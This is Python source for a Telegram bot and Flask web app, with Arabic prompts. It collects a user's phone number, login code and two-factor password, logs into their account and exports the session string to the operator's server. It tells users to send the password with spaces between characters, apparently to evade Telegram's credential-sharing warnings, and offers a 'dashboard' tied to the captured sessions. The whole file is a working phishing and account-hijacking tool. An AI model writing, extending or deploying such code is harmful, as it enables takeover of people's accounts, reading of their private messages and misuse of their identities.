import os
import secrets
import asyncio
import nest_asyncio
from flask import Flask, request, jsonify, send_file
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from pyrogram import Client as PyroClient
from pyrogram.errors import SessionPasswordNeeded
import logging

nest_asyncio.apply()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BASE_URL = os.environ.get("BASE_URL", "")

app = Flask(__name__)
sessions = {}
user_tokens = {}
pyro_clients = {}
application = None

PHONE, CODE, PASSWORD = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 أهلاً! أرسل رقم هاتفك مع رمز الدولة\nمثال: +9647801234567"
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    context.user_data["phone"] = phone
    try:
        client = PyroClient(
            name=f"session_{phone}",
            api_id=API_ID,
            api_hash=API_HASH,
            phone_number=phone,
            in_memory=True
        )
        await client.connect()
        sent = await client.send_code(phone)
        context.user_data["client"] = client
        context.user_data["phone_code_hash"] = sent.phone_code_hash
        await update.message.reply_text("✅ وصلك رمز على تلغرام، أرسله هنا:")
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ خطأ: {e}\nحاول مرة ثانية /start")
        return ConversationHandler.END

async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip().replace(" ", "")
    phone = context.user_data["phone"]
    client = context.user_data["client"]
    phone_code_hash = context.user_data["phone_code_hash"]
    try:
        await client.sign_in(phone, phone_code_hash, code)
        return await finish_login(update, context, client)
    except SessionPasswordNeeded:
        await update.message.reply_text(
            "🔐 حسابك عنده مصادقة ثنائية!\n\n"
            "أرسل كلمة المرور بشكل مفرق\n"
            "مثال: h e l l o 1 2 3"
        )
        return PASSWORD
    except Exception as e:
        await update.message.reply_text(f"❌ الرمز خاطئ: {e}\nأرسل الرمز مرة ثانية:")
        return CODE

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw = update.message.text.strip()
    password = raw.replace(" ", "")
    client = context.user_data["client"]
    try:
        await client.check_password(password)
        return await finish_login(update, context, client)
    except Exception:
        await update.message.reply_text("❌ كلمة المرور خاطئة\nحاول مرة ثانية:")
        return PASSWORD

async def finish_login(update: Update, context: ContextTypes.DEFAULT_TYPE, client):
    phone = context.user_data["phone"]
    session_str = await client.export_session_string()
    sessions[phone] = session_str
    user_id = update.effective_user.id
    token = secrets.token_hex(16)
    user_tokens[user_id] = token
    dashboard_url = f"{BASE_URL}/dashboard?token={token}"
    keyboard = [[InlineKeyboardButton("🚀 افتح لوحة التحكم", url=dashboard_url)]]
    await update.message.reply_text(
        "✅ تم تسجيل الدخول بنجاح!\n\nاضغط الزر لفتح لوحة التحكم:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("تم الإلغاء. اكتب /start للبدء من جديد.")
    return ConversationHandler.END

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/dashboard")
def dashboard():
    token = request.args.get("token")
    if not token or token not in user_tokens.values():
        return "غير مصرح", 403
    return send_file("index.html")

@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def webhook():
    data = request.get_json()
    if application:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            application.process_update(Update.de_json(data, application.bot))
        )
    return "ok"

@app.route("/api/send", methods=["POST"])
def send_messages():
    data = request.json
    phone = data.get("phone")
    if not sessions.get(phone):
        return jsonify({"error": "لا توجد جلسة"}), 401
    return jsonify({"status": "ok"})

async def setup():
    global application
    application = Application.builder().token(BOT_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE:    [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            CODE:     [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    application.add_handler(conv)
    await application.initialize()
    webhook_url = f"{BASE_URL}/webhook/{BOT_TOKEN}"
    await application.bot.set_webhook(webhook_url)
    logger.info(f"Webhook set: {webhook_url}")

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(setup())
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
